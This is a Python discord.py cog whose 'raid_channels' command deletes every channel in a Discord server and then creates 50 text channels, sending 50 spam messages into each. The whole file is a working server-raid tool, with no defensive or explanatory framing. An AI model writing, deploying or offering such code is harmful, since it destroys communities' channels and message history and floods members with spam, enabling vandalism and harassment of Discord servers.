import asyncio
import discord
from discord.ext import commands

CHANNEL_NAME = "CANAIS"  
MESSAGE = "MENSAGEM"  
NUM_CHANNELS = 50  
NUM_MESSAGES = 50  

class ChannelCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def delete_all_channels(self, guild):
        tasks = []
        for channel in guild.channels:
            tasks.append(channel.delete())
        await asyncio.gather(*tasks)
        print("Canais apagados")

    async def create_and_spam_channels(self, guild):
        tasks = []
        for _ in range(NUM_CHANNELS):
            try:
                new_channel = await guild.create_text_channel(CHANNEL_NAME)
                print(f"Canal criado: {new_channel.name}")
                for _ in range(NUM_MESSAGES):
                    tasks.append(new_channel.send(MESSAGE))
            except Exception as e:
                print(f"Erro ao criar canal ou enviar mensagem: {e}")

        await asyncio.gather(*tasks)
        print("Mensagens enviadas")

    @commands.command()
    async def raid_channels(self, ctx):
        guild = ctx.guild
        await self.delete_all_channels(guild)
        await self.create_and_spam_channels(guild)

def setup(bot):
    bot.add_cog(ChannelCommands(bot))
